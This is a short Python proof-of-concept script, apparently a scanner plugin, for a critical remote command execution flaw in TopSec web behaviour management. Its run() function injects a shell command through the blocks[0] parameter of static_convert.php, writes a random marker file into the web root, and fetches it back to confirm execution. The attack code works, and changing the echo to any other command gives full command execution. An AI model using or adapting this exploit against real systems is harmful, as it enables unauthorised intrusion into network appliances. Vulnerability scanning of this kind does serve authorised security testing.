#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/s_bv4k92Zz-kZFieKN2Qlg?poc_token=HEDR4GSjkP7hKISub5mwl_RbIt29Fg7YbEsvj_Kt',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '天融信上网行为管理 RCE',

      'level'     :   'critical',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  str1 = randomLowercase(20)
  str2 = randomLowercase(20)
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = f"/view/IPV6/naborTable/static_convert.php?blocks[0]=||  echo '{str2}' > /var/www/html/{str1}.txt%0A"
  # print(target)
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=20,verify=False)
    if res.status_code == 200 and str1 in res.text:
      pass
    else:
      return ret
    res.close()
    resp =requests.get(url=url+f'/{str1}.txt',headers=headers,timeout=5)
    if resp.status_code == 200 and str2 in resp.text:
      ret['huixian'] = url+f'/{str1}.txt'+'\n访问该地址的内容为：\t'+str2
      resp.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret